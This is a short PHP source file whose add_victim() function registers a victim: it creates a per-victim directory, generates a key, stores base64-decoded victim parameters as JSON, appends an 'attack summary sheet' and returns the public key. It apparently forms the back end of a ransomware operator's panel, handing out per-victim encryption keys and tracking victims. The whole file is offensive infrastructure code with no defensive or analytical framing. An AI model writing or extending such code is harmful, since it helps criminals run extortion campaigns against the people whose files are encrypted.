<?php
require_once('key_generate.php');
require_once('add_summary.php');
function add_victim($victim_id, $victim_params)
{
    $report="";
    $victims_dir=__DIR__."/victims/";

    $victim_folders = scandir($victims_dir);
    $folder = '__george_rr_martin_' . md5($victim_id);
    $victim_folder =$victims_dir.$folder;
    if (in_array($folder, $victim_folders)) {
        #$report="ID already exists";
    } else {

        #creating a directory for the victim_id
        mkdir($victim_folder, 0700);
        #$report="directory_created_*";

        #generating  key
        $pub_key_gen = key_generate($victim_id);
        #$report=$report."_key_generated_*";

        #writng values to a file
        $victim_file = $victim_folder.'/'.$victim_id.".json";
        $fileh = fopen($victim_file, "w");
        fwrite($fileh, base64_decode($victim_params));
        fclose($fileh);

        #appending the victim attack summary sheet
        add_summary($victim_file, $folder);
        return $pub_key_gen;
    }
}

?>
